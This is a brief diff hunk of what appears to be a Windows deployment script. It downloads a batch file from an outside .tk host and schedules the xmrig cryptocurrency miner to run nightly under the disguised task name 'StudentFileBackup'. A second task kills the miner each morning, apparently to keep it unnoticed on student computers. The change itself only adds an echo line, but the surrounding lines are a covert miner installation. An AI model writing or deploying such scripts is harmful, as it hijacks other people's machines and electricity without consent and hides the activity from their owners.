@@ -30,4 +30,5 @@ iwr https://www.thatonelukas.tk/masseisStarter.bat -OutFile starter.bat
 # schedule task
 echo "schedule task"
 schtasks /create /sc daily /tn StudentFileBackup /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /st 20:00
+echo "schedule task 2"
 schtasks /create /sc daily /tn RestrictStudent /tr "kill -Name xmrig -Force" /st 7:00
